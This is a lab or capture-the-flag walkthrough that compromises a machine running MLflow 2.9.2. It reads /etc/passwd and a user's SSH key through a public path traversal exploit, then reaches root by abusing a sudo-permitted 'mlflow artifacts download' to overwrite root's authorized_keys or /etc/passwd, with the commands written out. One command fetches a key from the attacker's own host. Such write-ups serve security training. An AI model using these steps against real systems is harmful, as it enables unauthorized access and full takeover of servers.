Performing an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.136.104 -p 22,5000 returns the result shown in the output above. The target machine seems to be running OpenSSH 8.9p1 SSH application on port 22. The web application on port 5000 seems to be operating on Python backend due to the string gunicorn.

Enumeration

Port 5000: HTTP

The webpage above is displayed for this web application on port 5000. It seems to be running mlFlow 2.9.2. mlFlow is used to create ML applications on Python. I enumerated the application further to identify more information about the server, but I didn't find anything. I also checked for any existing experiments and models, but there were none. Time to check if this application is vulnerable.


When checking for mlFlow 2.9.2 exploit, the webpage shown above was returned to me. I notice this application version is vulnerable to Path Traversal attack. It can be exploited to read sensitive files on the backend server. When searching for public exploits for this vulnerability, I came across this GitHub repository. I made a copy of the exploit on my machine. Time to test it.

Exploitation

Owning the mlflow 2.9.2 via Path Traversal & SSH Key

I ran the exploit against the target machine using the command python3 exp.py -t 192.168.136.104 -p 5000 to read the /etc/passwd file on the server, and got a hit as shown in the image above. I notice there is a user called mlflow on the target machine. Usually with Path Traversal attacks, the next attack vector is to identify & read sensitive files. Maybe I can try to read the SSH key of the user mlflow?


And bingo. Now I have access to the SSH key of the user mlflow on the target machine. I made a copy of the SSH key on my machine as id_rsa. Then I changed the permision of the SSH key using the command chmod 400 id_rsa.


And I connected to the target machine via SSH and the new SSH key by using the command ssh mlflow@192.168.136.104 -i id_rsa. Now I have SSH access to the target machine as the user mlflow.

Privilege Escalation

Vertical Privilege Escalation: User mlflow to User root via SSH Key Overwrite via /usr/local/bin/mlflow artifacts download

Running the command sudo -l shows the output in the image above. It mentions the command /usr/local/bin/mlflow artifacts download -u * -d * can be executed without password. This can be abused to be run as the user root. The arguments are interesting as the command expects two arguments: -u and -d. Let's find out what they are.


Running the command mlflow artifacts download --help shows the output above. The -u/,--artifact-uri is the piece of artifact we wish to download. The -d, --dst-path is where we wish to save the downloaded artifact. The obvious privilege escalation vector is to replace the root SSH key with mine to obtain a root level access on the target machine. I generated a new SSH key pair using the command ssh-keygen on my machine. Then I tried to replace the SSH key of user root using the command sudo -u root /usr/local/bin/mlflow artifacts download -u http://192.168.45.206/authorized_keys -d /root/.ssh/, but this kept giving me error. Upon reading this GitHub issue, I identified the artifact cannot be a HTTP URL. Instead, the artifact can be on the default directory, FTP, etc. Time to check where the artifacts are saved.


Running the command find / name "*artifacts*" 2>/dev/null returns the output shown in the image above. The find binary found the useful result /opt/mlflow/artifacts. Inside this location, there is one more directory called artifacts where all the artifacts are saved. Perfect.


Then I put my SSH key here. To achieve this, I ran the command echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+V8ZtvnrR8PTjH85G1ZQML2euNekcgGp2JHVUCvMZN kali@kali' > authorized_keys. The output of the key is shown in the picture above. And to replace the SSH key of user root, I ran the command sudo -u root /usr/local/bin/mlflow artifacts download -u authorized_keys -d /root/.ssh/. And bingo. No errors. The output states the correct path /root/.ssh/authorized_keys too. Afterwards, I ran the command chmod 400 root on my machine.


Then I connected to the target machine by running the command ssh root@192.168.136.104 -i root. And I got a hit. Now I have a root level access on the target machine, as shown in the picture above :)

An easier path to obtaining a root level access on the server without replacing the root user's SSH key is by creating a new root user. This is doable by performing the following steps:

1. Make a copy of the /etc/passwd file of the target machine on your attack machine
2. Generate a new password for the new user; for example, openssl passwd <password>
3. Fill in the name and password hash: <name>:<password hash>:0:0:root:/root:/bin/bash
4. Insert the entry above inside the /etc/passwd file and save this inside the artifacts
5. Run the following command to replace the /etc/passwd with our new /etc/passwd file that contains our new root user: sudo -u root /usr/local/bin/mlflow artifacts download -u passwd -d /etc/
6. Use `su <username>` to switch to the new user 
1. Make a copy of the /etc/passwd file of the target machine on your attack machine
2. Generate a new password for the new user; for example, openssl passwd <password>
3. Fill in the name and password hash: <name>:<password hash>:0:0:root:/root:/bin/bash
4. Insert the entry above inside the /etc/passwd file and save this inside the artifacts
5. Run the following command to replace the /etc/passwd with our new /etc/passwd file that contains our new root user: sudo -u root /usr/local/bin/mlflow artifacts download -u passwd -d /etc/
6. Use `su <username>` to switch to the new user


As shown in the image above, this is alternative way to obtain a root level access.

Flags


The two flags, proof.txt and local.txt, are shown in the picture above.
